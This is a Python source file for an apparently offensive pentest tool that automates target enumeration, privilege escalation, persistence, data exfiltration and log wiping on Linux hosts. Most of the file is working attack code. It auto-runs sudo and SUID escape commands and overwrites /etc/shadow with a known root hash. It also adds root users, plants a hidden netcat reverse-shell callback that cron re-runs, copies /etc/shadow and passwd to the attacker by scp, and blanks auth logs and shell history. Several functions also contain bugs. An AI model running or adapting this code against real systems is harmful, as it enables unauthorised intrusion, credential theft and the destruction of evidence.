#!/usr/bin/python3
# author: suffs811
# Copyright (c) 2023 suffs811
# https://github.com/suffs811/the-terminator.git
# read the README.md file for more details; software distributed under MIT license
# <> purpose: automate enumeration, privilege escalation, persistence, exfiltration, and reporting stages of a pentest
# initial shell will need to be done manually
#
# <> note: temrinator.py consists of four modules. for full terminator productivity, you will need to run the script *four* separate times:
# first on your own machine for target enumeration, second time on the target machine after manually gaining initial shell, 
# third time on target machine after terminator gains root privileges, and fourth time on your local machine to compile report.
#
# usage: (stage 1-enumerating target from local machine): python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
#
# usage: (stage 2-privilege escalation after gaining shell on target machine): python3 terminator.py priv -u <new_root_username> -p <new_root_passwd> 
#
# usage: (stage 3-persistence/data exfiltration after gaining root privileges on target machine): python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
#
# usage: (stage 4-create report on local machine): python3 terminator.py report -o <output_file_name>


import os
import argparse
import time
import re


# set command line flags and corresponding global variables
parser = argparse.ArgumentParser(description="script for automating common pentesting procedures \n<>run four times (1st on your machine, 2nd and 3rd on target machine, and 4th on your machine)\n\n(stage 1-enumerating target from local machine): python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))\n\n(stage 2-privilege escalation after gaining shell on target machine): python3 terminator.py priv\n\n(stage 3-persistence/data exfiltration after gaining root privileges on target machine): python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))\n\n(stage 4-create report on local machine): python3 terminator.py report -o <output_file_name>")
parser.add_argument("module", help="specify which module to use (enum/priv/root/report)")
parser.add_argument("-t", "--targetip", help="(enum) specify target ip to enumerate")
parser.add_argument("-w", "--wordlist", help="(enum) specify wordlist for directory walking (gobuster)")
parser.add_argument("-u", "--username", help="(priv/root) specify the username you want for the new user")
parser.add_argument("-p", "--password", help="(priv/root) specify the password you want for the new user")
parser.add_argument("-l", "--localip", help="(root) specify your (local) ip for data exfiltration and backdoor callback")
parser.add_argument("-x", "--localport", help="(root) specify your (local) port for backdoor callback")
parser.add_argument("-f", "--force", help="(root) force bypass of root permissions check (optional)", required=False, action="store_true")
parser.add_argument("-o", "--output", help="(report) specify name for report")
args = parser.parse_args()
module = args.module
ip = args.targetip
wordlist = args.wordlist
username = args.username
password = args.password
local_ip = args.localip
local_port = args.localport
output = args.output


print('''
 _______ _    _ ______ 
|__   __| |  | |  ____|  
   | |  | |__| | |__                                            |
   | |  |  __  |  __|  > - - - - - - - - - - - - - - - - - - +++ +++
   | |  | |  | | |____                                          | 
   |_|  |_|  |_|______|
 _______ ______ _____  __  __ _____ _   _       _______ ____  _____  
|__   __|  ____|  __ \|  \/  |_   _| \ | |   /\|__   __/ __ \|  __ \ 
   | |  | |__  | |__) | \  / | | | |  \| |  /  \  | | | |  | | |__) |
   | |  |  __| |  _  /| |\/| | | | | . ` | / /\ \ | | | |  | |  _  / 
   | |  | |____| | \ \| |  | |_| |_| |\  |/ ____ \| | | |__| | | \ \ 
   |_|  |______|_|  \_\_|  |_|_____|_| \_/_/    \_\_|  \____/|_|  \_\
\n
\\ created by: suffs811
\\ https://github.com/suffs811/the-terminator.git
''')

time.sleep(2)


# enumeration ###############################

# run nmap scans
def init_scan(ip):
   ports = []
   services = []

   # make terminator directory for output files
   os.system("mkdir /terminator/")
   os.system("touch /terminator/enum.txt")
   os.system("echo '### enumeration details for {} ###' > /terminator/enum.txt".format(ip))

   # run initial port scan
   print("\n### finding open ports... ###")
   os.system("nmap -vv -sS -n -Pn -T5 -p- {} -oN /terminator/scan_1".format(ip))

   # get ports for next scan
   with open("/terminator/scan_1") as scan_1:
      lines_1 = scan_1.readlines()
      for line in lines_1:
         number = re.search("\A[1-9][0-9]",line)
         if number:
            line_split = line.split(" ")
            first_word = line_split[0]
            ports.append(first_word[:-4].strip())
         else:
            continue

   print("\n### open ports: {}".format(ports))
   time.sleep(3)
   print("\n### finding services for ports... ###")
   port_scan = ",".join(ports)
   os.system("nmap -vv -A -p {} {} -oN /terminator/scan_2".format(port_scan,ip))

   # get services for open ports
   with open("/terminator/scan_2") as scan_2:
      lines_2 = scan_2.readlines()
      for line in lines_2:
         number = re.search("\A[1-9][0-9]",line)
         if number:
            services.append(line)
         else:
            continue

   os.system("echo ''")
   os.system("echo '### open ports and services on {} ###'| tee -a /terminator/enum.txt".format(ip))
   for item in services:
      os.system("echo '{}' | tee -a /terminator/enum.txt /terminator/services.txt".format(item))

   time.sleep(3)

   return services


# enumerate web service with nikto, gobuster, curl, and searchsploit
def web(ip,wordlist,services):
   print("\n### initiating web enumeration... ###")
   web_port = []
   for line in services:
      if "http" in line or "web" in line:
         split = line.split(" ")
         tcp = split[0]
         psplit = tcp.split("/")
         web_port.append(psplit[0])
      else:
         continue

   print("\n### running nikto... ###")
   os.system("echo '### nikto results ###' >> /terminator/enum.txt")
   os.system("nikto -h {} -t 3 -ask no | tee -a /terminator/enum.txt".format(ip))
   print("\n### running gobuster... ###")
   if wordlist:
      os.system("echo '### gobuster results ###' >> /terminator/enum.txt")
      os.system("gobuster dir -u {} -w {} | tee -a /terminator/enum.txt".format(ip,wordlist))
   else:
      os.system("echo '### gobuster results ###' >> /terminator/enum.txt")
      os.system("gobuster dir -u {} -w directory-list.txt | tee -a /terminator/enum.txt".format(ip))
   os.system("echo '### robots.txt results ###' >> /terminator/enum.txt")
   for port in web_port:
      print("\n### curling robots.txt for {}:{}... ###".format(ip,port))
      os.system("curl http://{}:{}/robots.txt | tee /terminator/robots.txt".format(ip,port.strip()))
      with open("/terminator/robots.txt") as rob:
         r = rob.readlines()
         for line in r:
            if "/" in line:
               os.system("echo '{}' >> /terminator/enum.txt".format(line))
               os.system("echo '{}' >> /terminator/robots_dir.txt".format(line))
            else:
               continue

   print("\n### web enum output saved to /terminator/enum.txt ###")


# use enum4linux and nmap to enumerate smb shares/users
def smb(ip):
   print("\n### initiating smb enumeration... ###")
   os.system("echo '### smb enumeration results ###' >> /terminator/enum.txt")
   os.system("enum4linux -A {} | tee -a /terminator/enum.txt /terminator/enum4lin.txt".format(ip))
   os.system("nmap -vv -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {} -oN /terminator/smb.txt".format(ip))
   os.system("cat /terminator/smb.txt >> /terminator/enum.txt")
   print("\n### smb enum output saved to /terminator/enum.txt ###")


# use nmap to try ftp anonymous login
def ftp(ip):
   print("\n### initiating ftp enumeration... ###")
   os.system("echo '### ftp enumeration results ###' >> /terminator/enum.txt")
   os.system("nmap -vv -p 21 --script=ftp-anon {} -oN /terminator/ftp_nmap.txt".format(ip))
   os.system("cat /terminator/ftp_nmap.txt >> /terminator/enum.txt")
   print("\n### ftp enum output saved to /terminator/enum.txt ###")


# use nmap to show NFS mounts
def nfs(ip):
   print("\n### initiating nfs enumeration... ###")
   os.system("echo '### nfs enumeration results ###' >> /terminator/enum.txt")
   os.system("nmap -vv -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {} -oN /terminator/nfs_nmap.txt".format(ip))
   os.system("cat /terminator/nfs_nmap.txt >> /terminator/enum.txt")
   os.system("echo ''")
   os.system("echo '### NFS mounts ###' | tee -a /terminator/enum.txt")
   os.system("/usr/sbin/showmount -e {} | tee -a /terminator/enum.txt /terminator/nfs.txt".format(ip))
   print("\n### nfs enum output saved to /terminator/enum.txt ###")


# tee important findings to file and print to screen
def imp_enum(ip):
   os.system("touch /terminator/imp_enum_results.txt")
   os.system("echo ''")
   os.system("echo ''")
   os.system("echo ''")
   os.system("echo '***********************************************************'")
   os.system("echo ''")
   os.system("echo '### enumeration results saved to /terminator/ directory ###'")
   os.system("echo ''")
   os.system("echo ''")
   os.system("echo '<> open ports and services on {} <>' | tee -a /terminator/imp_enum_results.txt".format(ip))
   os.system("cat /terminator/services.txt | tee -a /terminator/imp_enum_results.txt")
   os.system("rm -f /terminator/services.txt")
   os.system("echo ''")
   os.system("echo ''")
   os.system("echo '### important findings: ###' | tee -a /terminator/imp_enum_results.txt")
   os.system("echo ''")
   with open("/terminator/enum.txt") as enum:
      e = enum.readlines()
      for line in e:
         if "interesting" in line:
            os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
            os.system("echo ''")
         elif "robots" in line and "#" not in line:
            os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
            os.system("echo ''")
         elif "Anonymous" in line:
            os.system("echo '-- ftp anonymous login:'")
            os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
            os.system("echo ''")
         elif "allows session" in line:
            os.system("echo '-- smb no-auth login:'")
            os.system('echo "{}" | tee -a /terminator/imp_enum_results.txt'.format(line.strip()))
            os.system("echo ''")
         else:
            continue

   os.system("echo '-- nfs mounts:'")
   os.system("cat /terminator/nfs.txt 2>/dev/null")
   os.system("echo ''")
   os.system("echo 'robots.txt:'")
   os.system("cat /terminator/robots_dir.txt 2>/dev/null")

   os.system("rm -f /terminator/robots_dir.txt 2>/dev/null")
   os.system("rm -f /terminator/nfs.txt 2>/dev/null")


# privilege escalation ###############################

# disable history logging and create backups
def disable_hist():
   # create file to write data to
   os.system("touch /tmp/pwd.txt")

   print("\n### creating backups of log files... ###")
   os.system("mkdir /tmp/.backups")
   os.system("cp /var/log/auth.log /tmp/.backups/ 2>/dev/null")
   os.system("cp /var/log/cron.log /tmp/.backups/ 2>/dev/null")
   os.system("cp /var/log/maillog /tmp/.backups/ 2>/dev/null")
   os.system("cp /var/log/httpd /tmp/.backups/ 2>/dev/null")
   os.system("cp ~/.bash_history /tmp/.backups/ 2>/dev/null")
   os.system("cp /root/.bash_history /tmp/.backups/ 2>/dev/null")
   os.system("echo $history > /tmp/.backups/history 2>/dev/null")
   os.system("history -c 2>/dev/null")
   os.system("history -w 2>/dev/null")


# check for binaries that can be run as sudo and print privesc script to screen
def sudo_l():
   print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' then rerun this script to find sudoable commands ---###")
   time.sleep(5)
   print("\n### finding binaries you can run as sudo... ###")

   # check to see if user needs password to run sudo
   sudo_time = os.system("time timeout -k 5 5 sudo -l &>/dev/null")
   sudo_no_pass = None
   if sudo_time > float('1.0'):
     sudo_no_pass = False
   else:
      sudo_no_pass = True
      print("\n-+- password not needed to run sudo commands -+-")

   # commands that will be printed to screen bc they require user interation 
   sudo_bins_print = {
      "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE (to get remote file)",
      "ftp":"sudo ftp\n!/bin/sh",
      "more":"TERM= sudo more /etc/profile\n!/bin/sh",
      "nano":"sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
      "nc":"sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <localIP> <localPORT> >/tmp/f",
      "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
   }

   # commands to execute if appears in sudo -l results
   sudo_bins_exec = {
      "all":"sudo /bin/bash -p",
      "bash":"sudo /bin/bash -p",
      "base64":"sudo base64 /etc/shadow | base64 --decode",
      "cat":"sudo cat /etc/shadow",
      "chmod":"sudo chmod 6777 /etc/shadow&&cat /etc/shadow",
      "cp":"sudo cp /bin/sh /bin/cp\nsudo cp",
      "crontab":"sudo crontab -e",
      "docker":"sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
      "env":"sudo env /bin/sh",
      "grep":"sudo grep '' /etc/shadow",
      "gzip":"sudo gzip -f /etc/shadow -t",
      "mount":"sudo mount -o bind /bin/sh /bin/mount&&sudo mount",
      "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&sudo mv $TF $LFILE&&echo 'su root, passwd is 'password''",
      "mysql":"sudo mysql -e '\\! /bin/sh'",
      "perl":"sudo perl -e \"exec '/bin/sh';\"",
      "php":"CMD='/bin/sh'&&sudo php -r \"system('$CMD');\"",
      "python":"sudo python -c 'import os; os.system(\"/bin/sh\")'",
      "ruby":"sudo ruby -e 'exec \"/bin/sh\"'",
      "scp":"TF=$(mktemp)&&echo 'sh 0<&2 1>&2' > $TF&&chmod +x '$TF'&&sudo scp -S $TF x y:",
      "ssh":"sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x", 
      "tar":"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
      "vi":"sudo vi -c ':!/bin/sh' /dev/null", 
      "vim":"sudo vim -c ':!/bin/sh'",
      "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh&&/bin/sh 1>&0' >$TF&&sudo wget --use-askpass=$TF 0"
   }


   # open last line of sudo -l output to determine sudo capabilities
   with open('/tmp/sudo_l.txt') as sudol:
      last_line = sudol.readlines()[-1]
      lower_line = last_line.lower()

      # loop through dictionaries and print cmds if need user interaction, otherwise execute
      for key in sudo_bins_print:
         if key in lower_line:
            print("{}: {}".format(key,sudo_bins_print[key]))
            os.system("echo '{}:{} < ### can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
         else:
            continue

      for key in sudo_bins_exec:
         if key in lower_line:
            print("{}: {}".format(key,sudo_bins_exec[key]))
            os.system("echo '{}:{} < ### can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_exec[key]))
            sudo_cmd = sudo_bins_exec[key].strip()
            print(sudo_cmd)
            os.system("{}".format(sudo_cmd))
            exit()
         else:
            continue

   return sudo_no_pass


# try SUID/GUID files exloitation
def suid():
   print("\n### finding SUID files... ###")
   os.system("echo '### suid file search results ###' > /tmp/suid.txt")
   os.system("echo ' ' >> /tmp/sudo_l.txt")

   suid_bins_print = {
   "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
   "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
   }

   suid_bins_exec = {
   "base64":"./base64 /etc/shadow | base64 --decode",
   "bash":"./bash -p",
   "chmod":"./chmod 6777 /etc/shadow&&cat /etc/shadow",
   "cp":"./cp --attributes-only --preserve=all ./cp /etc/shadow",
   "dig":"./dig -f /etc/shadow",
   "docker":"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
   "env":"./env /bin/sh -p",
   "file":"./file -f /etc/shadow",
   "find":"./find . -exec /bin/sh -p \\; -quit",
   "gzip":"./gzip -f /etc/shadow -t",
   "mosquitto":"./mosquitto -c /etc/shadow",
   "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&./mv $TF $LFILE&& echo 'su root: passwd is 'password''",
   "nmap":"LFILE=/etc/shadow&&./nmap -oG=$LFILE root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::&& echo 'su root, passwd is 'password''",
   "openvpn":"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c 'sh -p''",
   "perl":"./perl -e 'exec '/bin/sh';'",
   "php":"CMD='/bin/sh'&&./php -r 'pcntl_exec('/bin/sh', ['-p']);'",
   "python":"./python -c 'import os; os.execl('/bin/sh', 'sh', '-p')'",
   "rsync":"./rsync -e 'sh -p -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null",
   "ssh-agent":"./ssh-agent /bin/ -p",
   "ssh-keygen":"./ssh-keygen -D ./lib.so",
   "ssh-keyscan":"./ssh-keyscan -f /etc/shadow",
   "sshpass":"./sshpass /bin/sh -p",
   "strings":"./strings /etc/shadow",
   "systemctl":"TF=$(mktemp).service&&echo '[Service]&&Type=oneshot&&ExecStart=/bin/sh -c 'id > /tmp/output'&&[Install]&&WantedBy=multi-user.target' > $TF&&./systemctl link $TF&&./systemctl enable --now $TF",
   "unzip":"./unzip -K shell.zip&&./sh -p",
   "vim":"./vim -c ':py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')'",
   "wc":"./wc --files0-from /etc/shadow",
   "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0",
   "zsh":"./zsh"
   }

   # find suid binaries, loop through dictionaries and print cmds if need user interaction, otherwise execute
   os.system("find / -type f -perm /4000 2>/dev/null >> /tmp/suid.txt")
   with open("/tmp/suid.txt") as suid_file:
      suid = suid_file.readlines()
      for line in suid:
         if ".sh" in line:
            print(line)
            os.system("echo '### {} is a suid binary and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(line))
         else:
            continue
         for key in suid_bins_print:
            if key in suid:
               print("\n{}: {}".format(key,suid_bins_print[key]))
               os.system("echo '### {}:{} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key.strip(),suid_bins_print[key].strip()))
            else:
               continue

         for key in suid_bins_exec:
            if key in suid:
               print("\n{}: {}".format(key,suid_bins_exec[key]))
               os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key.strip()))
               suid_cmd = value.strip()
               os.system("{}".format(suid_cmd))
               break
            else:
               continue


# try SUID executables for $PATH exploitation
def path():
   print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
   
   common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
   "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
   "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
   "help", "smbclient", "echo", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
   "git", "gh", "vi", "nano"]

   os.system("mkdir /tmp/.path/")
   os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
   os.system("find / -type f -perm /4000 2>/dev/null > /tmp/path.txt")
   print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
   with open("/tmp/path.txt") as root_files:
      lines = root_files.readlines()
      for line in lines:
         line_path = line
         split_path = line.split("/")
         split_path_1 = split_path[-1].strip()
         os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
   with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
      lines_strings = strings_file.readlines()
      for line in lines_strings:
         for cmd in common_cmds:
            non_path_cmd = re.search("\s{}\s".format(cmd), str(line))
            if non_path_cmd:
               print("### {} binary does not specify full path of {} ###".format(split_path_1,cmd))
               os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(split_path_1,cmd))
               os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line_path))
               break
            else:
               continue


# try writing to /etc/passwd or /etc/shadow
def pass_shadow(username,password):
   print("\n### checking if /etc/passwd or /etc/shadow are writable... ###")
   os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
   pass_file = open("/tmp/.backups/pass.txt", "r")
   new_user_pass = pass_file.readlines()[-1].strip()

   # check if /etc/passwd is writable and if so, add root user
   os.system("ls -l /etc/passwd > /tmp/passwd.txt")
   with open("/tmp/passwd.txt") as passwd:
      perms = passwd.readline()
      writable = re.search("\\A.......rw|\\A.......-w", perms)
      if writable:
         print("\n### /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
         os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/passwd_res.txt".format(username,password,username))
      else:
         print("\n*** /etc/passwd is not writable ***")
         os.system("echo '*** /etc/passwd is NOT world-writable ***' > /tmp/passwd_res.txt")

   # check if /etc/shadow is writable and if so, add root user
   os.system("ls -l /etc/shadow > /tmp/shad.txt")
   with open("/tmp/shad.txt") as shadow:
      perms = shadow.readline()
      writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
      if writable:
         print("\n### /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
         os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/shad_res.txt".format(username,password,username))
      else:
         print("\n*** /etc/shadow is not writable ***")
         os.system("echo '*** /etc/shadow is NOT world-writable ***' > /tmp/shad_res.txt")

   pass_file.close()

   # print results to screen
   os.system("touch /tmp/print.txt")
   os.system("echo ' '")
   os.system("echo ' '")
   os.system("echo ' '")
   os.system("echo '### Privilege Escalation Results ###' > /tmp/print.txt")
   os.system("echo ' ' >> /tmp/print.txt")
   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt 2>/dev/null")
   os.system("cat /tmp/sudo_l.txt >> /tmp/print.txt 2>/dev/null")
   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt 2>/dev/null")
   os.system("cat /tmp/suid.txt >> /tmp/print.txt 2>/dev/null")
   os.system("cat /tmp/path_res.txt >> /tmp/print.txt 2>/dev/null")
   os.system("cat /tmp/passwd_res.txt >> /tmp/print.txt 2>/dev/null")
   os.system("cat /tmp/shad_res.txt >> /tmp/print.txt 2>/dev/null")
   os.system("cat /tmp/print.txt")


# check for root
def root_check():
   os.system("id > /tmp/check.txt")
   with open("/tmp/check.txt") as check:
      read_check = check.readline()
      if "root" in read_check:
         print("\n-+- welcome, root -+-")
      else:
         print("\n-+- no privelege escalation path found... try manually -+-")


# persistence ###############################

# check for root permissions
def perm_check():
   os.system("whoami | tee /tmp/whoami.txt")
   with open("/tmp/whoami.txt") as who_file:
      who = who_file.readlines()[-1].strip()
      if who == "root":
         return True
      else:
         print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
         return False
         exit()


# add user with root perms
def add_user(username,password):
   if username:
      print("\n### establishing persistence... ###")
      os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
      pass_file = open("/tmp/.backups/pass.txt", "r")
      new_user_pass = pass_file.readlines()[-1].strip()
      os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
      os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
      os.system("usermod -aG sudo {}".format(username))
      print("\n### user {} created and added to sudo group ###".format(username))
      pass_file.close()
   else:
      print("\n*** error: username not specified: use -u to specify username ***")
      return


# create script for nc rev shell callback
def callback(local_ip, local_port):
   print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
   os.system("mkdir /dev/shm/.data")
   os.system("touch /dev/shm/.data/data_log")
   os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data_log".format(local_ip,local_port))
   os.system("chmod 100 /dev/shm/.data/data_log")
   os.system("chmod 700 /dev/shm/.data/")
   print("\n### callback placed at /dev/shm/.data/data_log ###")
   #os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))


# create cronjob for executing callback script every 5 min
def cron_make():
   print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
   os.system("echo '5 * * * * /bin/bash ./dev/shm/.data/data_log' >> /etc/crontab")
   print("\n### cronjob created ###")


# data exfiltration ###############################

# gather target machine data and write to files for exfiltration
def extract(username,password,local_ip,local_port):
   # write data to file
   print("\n### exfiltrating data... ###")

   # create files to write data to
   os.system("touch /tmp/data_exfil.txt")
   os.system("touch /tmp/priv.txt")

   # add peristence data to file
   os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
   os.system("echo 'user {}:{} was added with root privileges' >> /tmp/data_exfil.txt".format(username,password))
   os.system("echo 'nc reverse shell callback implanted at /dev/shm/.data/data_log' >> /tmp/data_exfil.txt")
   os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))

   # get system info and write to data file
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '### the following data was extracted as root user ###' >> /tmp/data_exfil.txt")
   os.system("echo 'id:' >> /tmp/data_exfil.txt")
   os.system("id | tee -a /tmp/data_exfil.txt")
   os.system("echo 'whoami:' >> /tmp/data_exfil.txt")
   os.system("whoami | tee -a /tmp/data_exfil.txt")
   os.system("echo 'netstat -tnlp:' >> /tmp/data_exfil.txt")
   os.system("netstat -tnpl | tee -a /tmp/data_exfil.txt")

   print("\n### /etc/passwd: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '/etc/passwd:' >> /tmp/data_exfil.txt")
   os.system("cat /etc/passwd | tee -a /tmp/data_exfil.txt")

   print("\n### /etc/shadow: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '/etc/shadow:' >> /tmp/data_exfil.txt")
   os.system("cat /etc/shadow | tee -a /tmp/data_exfil.txt")

   print("\n### /etc/hosts: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '/etc/hosts:' >> /tmp/data_exfil.txt")
   os.system("cat /etc/hosts | tee -a")

   print("\n### /etc/crontab: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '/etc/crontab:' >> /tmp/data_exfil.txt")
   os.system("cat /etc/crontab | tee -a /tmp/data_exfil.txt")

   print("\n### /etc/exports: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '/etc/exports:' >> /tmp/data_exfil.txt")
   os.system("cat /etc/exports 2>/dev/null | tee -a /tmp/data_exfil.txt")

   print("\n### SUID files: ###")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo '' >> /tmp/data_exfil.txt")
   os.system("echo 'suid files:' >> /tmp/data_exfil.txt")
   os.system("find / type -f perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")

   # compile previous files into one for scp
   os.system("cat /tmp/sudo_l.txt >> /tmp/priv.txt")
   os.system("cat /tmp/suid.txt >> /tmp/priv.txt")
   os.system("cat /tmp/path_res.txt >> /tmp/priv.txt")
   os.system("cat /tmp/passwd_res.txt >> /tmp/priv.txt")
   os.system("cat /tmp/shad_res.txt >> /tmp/priv.txt")


# export priv.txt and data_exfil.txt to local machine
def export(local_ip):
   time.sleep(1)

   # get username of local user to scp files to
   u_root = input("\n\n### specify local username to send data to (for scp): ")
   time.sleep(1)

   # try to scp files to local machine using inputted username
   os.system("touch /tmp/scp.txt")
   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n\n-+- input your password for local user {} -+-\n".format(u_root,local_ip,u_root))
   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/ && echo $? > /tmp/scp.txt".format(u_root,local_ip))

   with open("/tmp/scp.txt") as sc:
      ss = sc.readlines()
      s = ss[0].strip()
      print("- {} -".format(s))
      if s == "0":
         print("\n### data_exfil.txt and priv.txt sent to {}/terminator/ ###".format(local_ip))
      else:   
         print("\n*** error sending files to {}@{}:/terminator/\n*** specified user might not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
         export(local_ip)


# cover tracks ###############################

# reestablish history logging and replace log files
def clear_tracks(username,password,local_ip,local_port):
   print("\n### clearing and replacing log files to previous state... ###")
   os.system("echo ' ' > /var/log/auth.log 2>/dev/null")
   os.system("echo ' ' > /var/log/cron.log 2>/dev/null")
   os.system("echo ' ' > /var/log/maillog 2>/dev/null")
   os.system("echo ' ' > /var/log/httpd 2>/dev/null")
   os.system("history -c 2>/dev/null")
   os.system("history -w 2>/dev/null")
   os.system("echo ' ' > ~/.bash_history 2>/dev/null")
   os.system("echo ' ' > /root/.bash_history 2>/dev/null")

   # placing old contents back into logs
   os.system("echo /tmp/.backups/auth.log > /var/log/auth.log 2>/dev/null")
   os.system("echo /tmp/.backups/cron.log > /var/log/cron.log 2>/dev/null")
   os.system("echo /tmp/.backups/maillog > /var/log/maillog 2>/dev/null")
